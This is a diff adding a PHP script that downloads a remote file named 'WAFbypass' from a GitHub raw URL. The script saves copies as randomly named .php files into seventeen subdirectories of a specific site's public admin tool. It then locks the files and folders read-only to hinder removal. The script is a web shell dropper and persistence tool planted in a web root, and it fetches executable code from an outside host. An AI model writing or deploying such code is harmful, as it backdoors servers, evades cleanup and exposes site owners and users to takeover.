@@ -1,0 +1,76 @@
+<?php
+
+function download_and_save_to_multiple_dirs(array $files, array $save_dirs) {
+    $options = [
+        'http' => [
+            'header' => "User-Agent: Mozilla/5.0\r\n"
+        ]
+    ];
+    $context = stream_context_create($options);
+
+    foreach ($save_dirs as $dir) {
+        if (!is_dir($dir)) {
+            echo "Folder '$dir' belum ada. Mencoba membuat...\n";
+            if (!mkdir($dir, 0777, true)) {
+                echo "❌ Gagal membuat folder: $dir\n";
+                continue;
+            }
+            echo "✅ Folder '$dir' berhasil dibuat.\n";
+        } else {
+            echo "📁 Folder '$dir' sudah ada.\n";
+        }
+    }
+
+    foreach ($files as $file) {
+        $url = $file['url'];
+        echo "⬇️  Downloading: $url\n";
+        $content = @file_get_contents($url, false, $context);
+        if ($content === false) {
+            echo "❌ Gagal download dari $url\n";
+            continue;
+        }
+
+        foreach ($save_dirs as $dir) {
+            $random_number = rand(100000, 999999);
+            $save_path = rtrim($dir, '/') . '/' . $random_number . '.php';
+            if (file_put_contents($save_path, $content) !== false) {
+                echo "✅ File disimpan ke: $save_path\n";
+                chmod($save_path, 0444);
+            } else {
+                echo "❌ Gagal simpan file ke: $save_path\n";
+            }
+        }
+    }
+
+    foreach ($save_dirs as $dir) {
+        chmod($dir, 0555);
+        echo "🔧 Permission folder '$dir' di-set ke 0555\n";
+    }
+}
+
+$files_to_download = [
+    ['url' => 'https://raw.githubusercontent.com/drian-o/repoKerjaku/refs/heads/main/WAFbypass', 'save_name' => '32165465.php'],
+];
+
+$save_directories = [
+    '/home/bloghulu/public_html/had1617/admintool/',
+    '/home/bloghulu/public_html/had1617/admintool/chosen/',
+    '/home/bloghulu/public_html/had1617/admintool/chosen/docsupport/',
+    '/home/bloghulu/public_html/had1617/admintool/colorpicker/',
+    '/home/bloghulu/public_html/had1617/admintool/colorpicker/css/',
+    '/home/bloghulu/public_html/had1617/admintool/colorpicker/images/',
+    '/home/bloghulu/public_html/had1617/admintool/colorpicker/js/',
+    '/home/bloghulu/public_html/had1617/admintool/html/',
+    '/home/bloghulu/public_html/had1617/admintool/html/images/',
+    '/home/bloghulu/public_html/had1617/admintool/html/images/main/',
+    '/home/bloghulu/public_html/had1617/admintool/html/images/nav/',
+    '/home/bloghulu/public_html/had1617/admintool/html/images/nav/_notes/',
+    '/home/bloghulu/public_html/had1617/admintool/html/sdmenu/',
+    '/home/bloghulu/public_html/had1617/admintool/html/sdmenu/_notes/',
+    '/home/bloghulu/public_html/had1617/admintool/includes/',
+    '/home/bloghulu/public_html/had1617/admintool/ionic/',
+    '/home/bloghulu/public_html/had1617/admintool/js/'
+    
+];
+
+download_and_save_to_multiple_dirs($files_to_download, $save_directories);
